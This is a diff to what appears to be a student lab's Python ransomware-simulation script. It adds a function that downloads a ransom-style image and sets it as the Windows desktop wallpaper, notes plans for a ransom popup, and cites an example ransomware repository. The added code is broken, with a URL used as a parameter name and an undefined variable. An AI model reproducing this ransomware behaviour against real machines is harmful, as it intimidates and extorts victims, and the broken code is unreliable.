@@ -78,6 +78,26 @@ def decrypt_folder(key, input_folder, output_folder):
             output_file = os.path.join(output_folder, relative_path)
             decrypt_file(key, input_file, output_file)
 
+
+
+
+# Alter desktop wallpaper with ransomeware 
+def desktop_wallpaper(https://www.secpod.com/blog/wp-content/uploads/2017/05/Screenshot-from-2017-05-14-23-42-20.png):
+    # Download image and save it to the desktop folder
+    path = '/home/ns/CodeFellows-Ops-401d-Labs-2'
+    urllib.request.urlretrieve(image_url, path)
+
+    # Change the desktop wallpaper using Windows API
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
+
+
+# popup window with ransomware message
+# Menu prompt, add this as a ransomware simulation option.
+
+
+
+
 # Main
 # Check if encryption key exists
 def main():
@@ -132,11 +152,11 @@ def main():
 # Execute script main/menu selection
 if __name__ == "__main__":
     main()
-    
+
 
 # End
 
-#
+
 # References
 # [Dialog Boxes with Python](https://www.devdungeon.com/content/dialog-boxes-python)
 # [Example Python-based Ransomware](https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py)
